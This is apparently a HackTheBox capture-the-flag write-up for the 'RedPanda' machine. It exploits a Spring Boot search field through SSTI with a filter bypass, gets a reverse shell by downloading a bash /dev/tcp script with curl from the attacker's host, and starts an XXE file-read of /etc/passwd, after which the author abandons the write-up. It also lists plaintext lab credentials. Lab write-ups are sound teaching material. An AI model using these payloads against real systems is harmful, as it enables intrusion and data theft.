---
title: RedPanda
tags:
  - HackTheBox
  - Easy
  - Linux
  - Springboot
  - SSTI
  - pspy
  - Code_Review
  - XXE
date: 2025-06-04T00:00:00Z
---
![](Pasted%20image%2020250604184103.png)

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.11.170 redpanda.htb" | sudo tee -a /etc/hosts
```

Then, I performed a Nmap scan:

```shell
ports=$(nmap -p- --min-rate=1000 -T4 redpanda.htb | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) 

nmap -p$ports -sC -sV redpanda.htb > sC.txt

[redacted]
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
8080/tcp open  http    Apache Tomcat (language: en)
|_http-title: Red Panda Search | Made with Spring Boot
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The Nmap scan outputs that the website is using Spring Boot and Tomcat. So I checked port 8080:

![](Pasted%20image%2020250604184314.png)

There is a search functionality called `/search`, which shows a range of pandas?. This functionality makes a `POST` request:

![](Pasted%20image%2020250604184900.png)

![](Pasted%20image%2020250604190146.png)

Inspecting the source code again I found out a hidden endpoint called `/stats` with the parameter `?author`:

![](Pasted%20image%2020250604185004.png)

For example, I'll inspect `http://redpanda.htb:8080/stats?author=woodenk`:

![](Pasted%20image%2020250604185202.png)

There is also another functionality to export an XML inside `/export.xml`:

![](Pasted%20image%2020250604185310.png)

## Foothold

I'll test for SSTI inside the `/search` functionality:

![](Pasted%20image%2020250604190625.png)

Doing the basic payload `${7*7}` gives me an error message of "banned characters", so I'll try to bypass that message:
- It works with the payload `*{7*7}`

![](Pasted%20image%2020250604191308.png)

## Weaponization

The website is using Srping Boot, so it may be using Spring Framework. I found this note in [HackTricks](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html#spring-framework-java) about it.

## Exploitation

```java
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```

![](Pasted%20image%2020250604192311.png)

> Got RCE :D

So now I'll try to get a reverse shell:
- First I'll create a script that contains the shell:

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.22/666 0>&1
```

- Now I'll host a python server:

```shell
python3 -m http.server 8090
```

- Then I'll apply the following payload to the petition:

```java
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('curl http://10.10.14.22:8090/shell.sh -o /tmp/gitblanc.sh').getInputStream())}
```

```java
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('chmod +x /tmp/gitblanc.sh').getInputStream())}
```

```java
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('/bin/bash /tmp/gitblanc.sh').getInputStream())}
```

> Got a reverse shell :D

![](Pasted%20image%2020250604194655.png)

### User flag

![](Pasted%20image%2020250604194840.png)

## Privilege Escalation

Inspecting the machine I found the file `.m2/wrapper/dists/apache-maven-3.8.3-bin/5a6n1u8or3307vo2u2jgmkhm0t/apache-maven-3.8.3/conf/settings.xml` which mentions `Java JDK 1.4.2_07`:

![](Pasted%20image%2020250604195148.png)

Inside of `/opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java` I found user `woodenk`'s credentials:

![](Pasted%20image%2020250604195446.png)

> Credentials found: `woodenk:RedPandazRule`

We can now connect via SSH to the machine.

As I didn't find anything interesting, I decided to upload **pspy** to the machine and inspect for hidden sub-processes. There is a weird sub-process run by root:

![](Pasted%20image%2020250604200512.png)

```shell
2025/06/04 18:04:01 CMD: UID=0     PID=99652  | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar 
```

As it is a custom script, I'll try to inspect its source code:

```shell
cat /opt/credit-score/LogParser/final/src/main/java/com/logparser/App.java

[redacted]
public class App {
    public static Map parseLog(String line) {
        String[] strings = line.split("\\|\\|");
        Map map = new HashMap<>();
        map.put("status_code", Integer.parseInt(strings[0]));
        map.put("ip", strings[1]);
        map.put("user_agent", strings[2]);
        map.put("uri", strings[3]);
        

        return map;
    }
    public static boolean isImage(String filename){
        if(filename.contains(".jpg"))
        {
            return true;
        }
        return false;
    }
    public static String getArtist(String uri) throws IOException, JpegProcessingException
    {
        String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
        File jpgFile = new File(fullpath);
        Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
        for(Directory dir : metadata.getDirectories())
        {
            for(Tag tag : dir.getTags())
            {
                if(tag.getTagName() == "Artist")
                {
                    return tag.getDescription();
                }
            }
        }

        return "N/A";
    }
    public static void addViewTo(String path, String uri) throws JDOMException, IOException
    {
        SAXBuilder saxBuilder = new SAXBuilder();
        XMLOutputter xmlOutput = new XMLOutputter();
        xmlOutput.setFormat(Format.getPrettyFormat());

        File fd = new File(path);
        
        Document doc = saxBuilder.build(fd);
        
        Element rootElement = doc.getRootElement();
 
        for(Element el: rootElement.getChildren())
        {
    
            
            if(el.getName() == "image")
            {
                if(el.getChild("uri").getText().equals(uri))
                {
                    Integer totalviews = Integer.parseInt(rootElement.getChild("totalviews").getText()) + 1;
                    System.out.println("Total views:" + Integer.toString(totalviews));
                    rootElement.getChild("totalviews").setText(Integer.toString(totalviews));
                    Integer views = Integer.parseInt(el.getChild("views").getText());
                    el.getChild("views").setText(Integer.toString(views + 1));
                }
            }
        }
        BufferedWriter writer = new BufferedWriter(new FileWriter(fd));
        xmlOutput.output(doc, writer);
    }
    public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException {
        File log_fd = new File("/opt/panda_search/redpanda.log");
        Scanner log_reader = new Scanner(log_fd);
        while(log_reader.hasNextLine())
        {
            String line = log_reader.nextLine();
            if(!isImage(line))
            {
                continue;
            }
            Map parsed_data = parseLog(line);
            System.out.println(parsed_data.get("uri"));
            String artist = getArtist(parsed_data.get("uri").toString());
            System.out.println("Artist: " + artist);
            String xmlPath = "/credits/" + artist + "_creds.xml";
            addViewTo(xmlPath, parsed_data.get("uri").toString());
        }

    }
}
```

The code creates a log called `redpanda.log`. Then creates a variable artist by calling the function `getArtist()`. This function reads the metadata inside an image and then searches inside the directories contained in it. Then the code creates a new xml file and it's passed to the function `addViewTo()`. Then the function `addViewTo()` parses the XML, increments the view count for that image, and then writes the file back.

## Exploitaiton x2

We can try to exploit an XXE File Read vulnerability by inputting the correct metadata inside and image being read by the code.
- NOTE: I'll append the schema made by [0xdf](https://0xdf.gitlab.io/2022/11/26/htb-redpanda.html) because I liked it after finishing the machine:

![](Pasted%20image%2020250604201800.png)

First, I downloaded an xml generated by the app and then I modified it with the XXE payoad:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<credits>
  <author>woodenk</author>
  <image>
    <uri>/img/greg.jpg</uri>
    <views>0</views>
    <test>&xxe;</test>
  </image>
  <image>
    <uri>/img/hungy.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/smooch.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/smiley.jpg</uri>
    <views>0</views>
  </image>
  <totalviews>0</totalviews>
</credits>
```

Didn't like the machine at all :/, so I won't continue the writeup.

==Machine pwned!==

